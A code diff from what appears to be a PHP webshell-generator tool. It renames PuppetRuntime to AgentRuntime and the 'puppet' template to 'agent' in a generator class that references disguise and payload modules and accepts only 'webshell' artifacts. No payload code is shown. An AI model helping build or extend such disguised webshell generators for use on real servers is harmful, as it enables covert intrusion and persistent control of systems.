@@ -5,7 +5,7 @@ import org.leo.core.disguise.DisguiseProtocol;
 import org.leo.core.generator.GeneratedArtifact;
 import org.leo.core.generator.GenerationRequest;
 import org.leo.core.generator.ScriptGeneratorProvider;
-import org.leo.core.runtime.PuppetRuntime;
+import org.leo.core.runtime.AgentRuntime;
 import org.leo.phpcore.disguise.PhpSourceSupport;
 import org.leo.phpcore.payload.PhpPayloadSource;
 import org.springframework.stereotype.Component;
@@ -31,7 +31,7 @@ import java.util.zip.Deflater;
 @Component
 public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider {
 
-    private static final String TEMPLATE = "/templates/php-puppet.php.txt";
+    private static final String TEMPLATE = "/templates/php-agent.php.txt";
     private static final String CORE_TEMPLATE = "/templates/php-core.php.txt";
     private static final String MINIMUM_VERSION = "5.6";
     private static final String OUTPUT_COMPACT = "compact";
@@ -52,8 +52,8 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
             "FirewallComponent", "UserAccountComponent");
 
     @Override
-    public PuppetRuntime getRuntime() {
-        return PuppetRuntime.PHP;
+    public AgentRuntime getRuntime() {
+        return AgentRuntime.PHP;
     }
 
     @Override
@@ -96,7 +96,7 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
 
     @Override
     public GeneratedArtifact generate(GenerationRequest request) throws IOException {
-        if (request == null || request.getRuntime() != PuppetRuntime.PHP) {
+        if (request == null || request.getRuntime() != AgentRuntime.PHP) {
             throw new IllegalArgumentException("PHP 生成器收到错误的 runtime");
         }
         if (!"webshell".equalsIgnoreCase(request.getArtifactType())) {
